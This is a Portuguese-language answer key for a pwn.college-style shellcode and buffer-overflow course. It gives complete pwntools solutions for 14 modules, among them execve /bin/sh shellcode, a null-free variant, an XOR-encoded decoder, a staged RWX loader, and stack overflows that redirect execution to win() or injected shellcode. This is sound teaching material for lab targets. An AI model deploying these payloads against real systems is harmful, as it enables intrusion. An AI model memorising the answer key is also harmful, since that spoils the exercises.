# Solucoes dos desafios

Os arquivos desta pasta sao gabaritos para testar os desafios na plataforma. Eles usam Python apenas para chamar `pwntools` e gerar bytes de shellcode; a execucao continua sendo feita pelo harness C do challenge.

Para testar um modulo, copie o `solve.py` correspondente para `/home/hacker/solve.py` no desafio e execute:

```bash
python3 /home/hacker/solve.py
/challenge/check
```

No modulo 6, o script tambem cria `/home/hacker/stage2.bin`.

| Modulo | Solucao |
|---|---|
| 1 | `solucoes/modulo-01-exit42/solve.py` |
| 2 | `solucoes/modulo-02-spawn-shell/solve.py` |
| 3 | `solucoes/modulo-03-null-free/solve.py` |
| 4 | `solucoes/modulo-04-comando-unico/solve.py` |
| 5 | `solucoes/modulo-05-encoded/solve.py` |
| 6 | `solucoes/modulo-06-staged/solve.py` |
| 7 | `solucoes/modulo-07-canal-local/solve.py` |
| 8 | `solucoes/modulo-08-var-adjacente/solve.py` |
| 9 | `solucoes/modulo-09-ponteiro-funcao/solve.py` |
| 10 | `solucoes/modulo-10-endereco-retorno/solve.py` |
| 11 | `solucoes/modulo-11-nop-sled/solve.py` |
| 12 | `solucoes/modulo-12-offset/solve.py` |
| 13 | `solucoes/modulo-13-controle-rip/solve.py` |
| 14 | `solucoes/modulo-14-shellcode-injetado/solve.py` |

O gabarito do modulo 5 nao grava `ENCODED_OK` em claro no payload. O modulo 6 limita o stage 1 a 64 bytes e o stage 2 a 512 bytes.

Nos modulos 8 a 14, o `solve.py` compila o `vuln.c` do challenge para ler
enderecos/offsets de forma deterministica antes de montar o payload, entao rode-o
dentro do challenge (onde `/challenge/vuln.c` existe). O Metasploit nao tem gabarito
aqui: ele e so conceito (ver `METASPLOIT_INTRO.md`), praticado fora do pwn.college.

# Gabarito - Shellcode com pwntools

Este arquivo segue o modelo `SOLUCOES.md` do repositorio de referencia. Cada secao mostra a solucao completa que deve ser copiada para o challenge correspondente no pwn.college.

Os scripts usam Python somente para chamar `pwntools` e montar o Assembly. O carregamento e a execucao continuam no harness C do challenge.

## Como testar na plataforma

Dentro de cada challenge, crie o arquivo `/home/hacker/solve.py` com a solucao da secao correspondente e execute:

```bash
python3 /home/hacker/solve.py
/challenge/check
```

Os arquivos prontos tambem estao em `solucoes/modulo-XX/solve.py`.

---

## Modulo 1 - `exit42`

Objetivo: terminar com codigo de saida `42`.

```python
from pwn import asm, context

context.arch = "amd64"
payload = asm("""
	mov eax, 60
	mov edi, 42
	syscall
""")
open("/home/hacker/payload.bin", "wb").write(payload)
```

Teste:

```bash
python3 /home/hacker/solve.py
/challenge/check
```

---

## Modulo 2 - `spawn-shell`

Objetivo: executar `/bin/sh` com `execve`.

```python
from pwn import asm, context

context.arch = "amd64"
payload = asm("""
	xor rdx, rdx
	push rdx
	mov rbx, 0x68732f2f6e69622f
	push rbx
	mov rdi, rsp
	push rdx
	push rdi
	mov rsi, rsp
	mov eax, 59
	syscall
""")
open("/home/hacker/payload.bin", "wb").write(payload)
```

O checker testa o shell com `printf SHELL_OK; exit`.

---

## Modulo 3 - `null-free`

Objetivo: executar o shell sem nenhum byte `0x00`.

```python
from pwn import asm, context

context.arch = "amd64"
payload = asm("""
	xor rdx, rdx
	push rdx
	mov rbx, 0x68732f2f6e69622f
	push rbx
	mov rdi, rsp
	push rdx
	push rdi
	mov rsi, rsp
	xor eax, eax
	mov al, 59
	syscall
""")
assert b"\x00" not in payload
open("/home/hacker/payload.bin", "wb").write(payload)
```

O checker rejeita o payload se encontrar `0x00` e testa `NULL_FREE_OK` no shell.

---

## Modulo 4 - `comando-unico`

Objetivo: escrever somente `COMANDO_UNICO_OK` e encerrar, sem abrir shell.

```python
from pwn import asm, context

context.arch = "amd64"
payload = asm("""
	mov eax, 1
	mov edi, 1
	mov edx, 17
	lea rsi, [rip + message]
	syscall
	mov eax, 60
	xor edi, edi
	syscall
message:
	.ascii "COMANDO_UNICO_OK\\n"
""")
open("/home/hacker/payload.bin", "wb").write(payload)
```

---

## Modulo 5 - `encoded`

Objetivo: usar decoder XOR em runtime. A mensagem `ENCODED_OK` nao pode estar em claro no arquivo.

```python
from pwn import asm, context

context.arch = "amd64"
key = 0xAA
stage2 = asm("""
	mov eax, 1
	mov edi, 1
	mov edx, 10
	lea rsi, [rip + message]
	syscall
	mov eax, 60
	xor edi, edi
	syscall
message:
	.ascii "ENCODED_OK"
""")
encoded = bytes(byte ^ key for byte in stage2)
encoded_text = ", ".join(f"0x{byte:02x}" for byte in encoded)

payload = asm(f"""
	jmp get_data
decoder:
	pop rsi
	mov rdi, rsi
	mov ecx, {len(encoded)}
decode:
	xor byte ptr [rsi], {key}
	inc rsi
	loop decode
	jmp rdi
get_data:
	call decoder
	.byte {encoded_text}
""")
assert b"ENCODED_OK" not in payload
open("/home/hacker/payload.bin", "wb").write(payload)
```

---

## Modulo 6 - `staged`

Objetivo: o stage 1 le o stage 2 pela entrada padrao e executa seus bytes. O stage 1 deve ter no maximo 64 bytes.

```python
from pwn import asm, context

context.arch = "amd64"
stage1 = asm("""
	mov eax, 9
	xor edi, edi
	mov esi, 0x1000
	mov edx, 7
	mov r10d, 0x22
	push -1
	pop r8
	xor r9d, r9d
	syscall
	mov rsi, rax
	xor eax, eax
	xor edi, edi
	mov edx, 512
	syscall
	jmp rsi
""")
stage2 = asm("""
	mov eax, 1
	mov edi, 1
	mov edx, 9
	lea rsi, [rip + message]
	syscall
	mov eax, 60
	xor edi, edi
	syscall
message:
	.ascii "STAGED_OK"
""")
assert len(stage1) <= 64
open("/home/hacker/payload.bin", "wb").write(stage1)
open("/home/hacker/stage2.bin", "wb").write(stage2)
```

Teste:

```bash
python3 /home/hacker/solve.py
ls -l /home/hacker/payload.bin /home/hacker/stage2.bin
/challenge/check
```

---

## Modulo 7 - `canal-local`

Objetivo: executar `/bin/sh` usando stdin/stdout como canal ja estabelecido pelo checker.

```python
from pwn import asm, context

context.arch = "amd64"
payload = asm("""
	xor rdx, rdx
	push rdx
	mov rbx, 0x68732f2f6e69622f
	push rbx
	mov rdi, rsp
	push rdx
	push rdi
	mov rsi, rsp
	mov eax, 59
	syscall
""")
open("/home/hacker/payload.bin", "wb").write(payload)
```

O checker envia `printf CANAL_LOCAL_OK; exit` pelo canal local e verifica a resposta.

---

## Modulo 8 - `var-adjacente`

Objetivo: sobrescrever a variavel `admin` (0x1337) adjacente ao buffer.

```python
from pwn import p64
payload = b"A" * 32 + p64(0x1337)
open("/home/hacker/payload.bin", "wb").write(payload)
```

---

## Modulo 9 - `ponteiro-funcao`

Objetivo: sobrescrever o ponteiro `handler` com o endereco de `win()`.

```python
from pwn import p64, ELF, context
import subprocess
context.log_level = "error"
subprocess.run(["gcc", "-O0", "-fno-stack-protector", "-no-pie",
                "/challenge/vuln.c", "-o", "/tmp/vuln_solve"], check=True)
win = ELF("/tmp/vuln_solve").symbols["win"]
open("/home/hacker/payload.bin", "wb").write(b"A" * 32 + p64(win))
```

---

## Modulo 10 - `endereco-retorno`

Objetivo: sobrescrever o endereco de retorno (offset 72) com `win()`.

```python
from pwn import p64, ELF, context
import subprocess
context.log_level = "error"
subprocess.run(["gcc", "-O0", "-fno-stack-protector", "-no-pie",
                "/challenge/vuln.c", "-o", "/tmp/vuln_solve"], check=True)
win = ELF("/tmp/vuln_solve").symbols["win"]
open("/home/hacker/payload.bin", "wb").write(b"A" * 72 + p64(win))
```

---

## Modulo 11 - `nop-sled`

Objetivo: NOP sled (>= 200) + shellcode que imprime `NOP_SLED_OK`.

```python
from pwn import asm, context
context.arch = "amd64"
shellcode = asm('''
    mov eax, 1
    mov edi, 1
    lea rsi, [rip + message]
    mov edx, 12
    syscall
    mov eax, 60
    xor edi, edi
    syscall
message:
    .ascii "NOP_SLED_OK\\n"
''')
open("/home/hacker/payload.bin", "wb").write(b"\x90" * 256 + shellcode)
```

---

## Modulo 12 - `offset`

Objetivo: descobrir o offset com `cyclic` (vale 120) e saltar para `win()`.

```python
from pwn import p64, ELF, context
import subprocess
context.log_level = "error"
subprocess.run(["gcc", "-O0", "-fno-stack-protector", "-no-pie",
                "/challenge/vuln.c", "-o", "/tmp/vuln_solve"], check=True)
win = ELF("/tmp/vuln_solve").symbols["win"]
open("/home/hacker/payload.bin", "wb").write(b"A" * 120 + p64(win))
```

Descoberta do offset: `cyclic(400)` -> rodar sob `gdb` -> `cyclic_find(valor)`.

---

## Modulo 13 - `controle-rip`

Objetivo: offset 136, retorno apontando para o buffer, shellcode imprime `RIP_OK`.
Ver `solucoes/modulo-13-controle-rip/solve.py` (compila com `-z execstack`, le o
endereco do buffer no `[leak]` e monta `shellcode + NOPs + p64(buf)`).

---

## Modulo 14 - `shellcode-injetado`

Objetivo: `[sled][execve /bin/sh][NOPs][ret = buf]`; o checker envia
`echo BOF_SHELL_OK` pelo stdin. Ver `solucoes/modulo-14-shellcode-injetado/solve.py`.

---

## Resumo dos arquivos

| Modulo | Arquivo pronto |
|---|---|
| 1 | `solucoes/modulo-01-exit42/solve.py` |
| 2 | `solucoes/modulo-02-spawn-shell/solve.py` |
| 3 | `solucoes/modulo-03-null-free/solve.py` |
| 4 | `solucoes/modulo-04-comando-unico/solve.py` |
| 5 | `solucoes/modulo-05-encoded/solve.py` |
| 6 | `solucoes/modulo-06-staged/solve.py` |
| 7 | `solucoes/modulo-07-canal-local/solve.py` |
| 8 | `solucoes/modulo-08-var-adjacente/solve.py` |
| 9 | `solucoes/modulo-09-ponteiro-funcao/solve.py` |
| 10 | `solucoes/modulo-10-endereco-retorno/solve.py` |
| 11 | `solucoes/modulo-11-nop-sled/solve.py` |
| 12 | `solucoes/modulo-12-offset/solve.py` |
| 13 | `solucoes/modulo-13-controle-rip/solve.py` |
| 14 | `solucoes/modulo-14-shellcode-injetado/solve.py` |
